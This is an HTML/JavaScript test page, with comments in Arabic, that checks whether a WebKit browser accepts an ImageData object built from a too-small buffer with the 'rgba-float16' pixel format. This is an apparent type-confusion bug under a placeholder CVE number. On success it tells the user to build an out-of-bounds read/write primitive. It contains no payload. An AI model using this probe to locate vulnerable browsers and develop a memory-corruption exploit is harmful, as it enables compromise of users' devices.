<!DOCTYPE html>
<html>
<head>
    <title>CVE-2026-XXXX - ImageData Type Confusion Test</title>
</head>
<body style="background-color: #1e1e1e; color: white; font-family: monospace;">
    <h1>WebKit ImageData Vulnerability Check</h1>
    <div id="log"></div>

    <script>
        function logMessage(msg, color) {
            const logDiv = document.getElementById("log");
            logDiv.innerHTML += `<p style="color: ${color}; font-size: 18px;">${msg}</p>`;
        }

        function checkImageDataVulnerability() {
            logMessage("[*] Initializing test payload...", "yellow");
            
            try {
                // 1. إنشاء مصفوفة بحجم صغير (Uint8ClampedArray)
                let testArray = new Uint8ClampedArray(4); // 4 bytes total
                
                // 2. محاولة دمجها مع إعدادات تتطلب حجم أكبر (rgba-float16)
                // في النسخ المصابة، سيمر هذا السطر دون أخطاء.
                let img = new ImageData(testArray, 1, 1, { colorSpace: "srgb", pixelFormat: "rgba-float16" });
                
                // 3. إذا وصلنا إلى هنا، فهذا يعني أن المتصفح قبل التناقض!
                logMessage("[!] VULNERABLE: The browser accepted mismatched pixel formats (No exception thrown).", "red");
                logMessage("[!] You can proceed to build the OOB Read/Write primitive.", "red");
                
            } catch (e) {
                // 4. في النسخ المحدثة، سيتم إيقاف العملية هنا
                if (e.name === "InvalidStateError") {
                    logMessage("[+] PATCHED: The browser threw 'InvalidStateError' as expected.", "green");
                } else if (e.name === "TypeError" || e.name === "NotSupportedError") {
                    logMessage("[-] INCONCLUSIVE: The browser threw '" + e.name + "'. Float16 or pixelFormat dictionary might not be supported on this firmware version.", "orange");
                } else {
                    logMessage("[?] UNKNOWN ERROR: " + e.name + " - " + e.message, "orange");
                }
            }
        }

        // تشغيل الفحص
        setTimeout(checkImageDataVulnerability, 1000);
    </script>
</body>
</html>
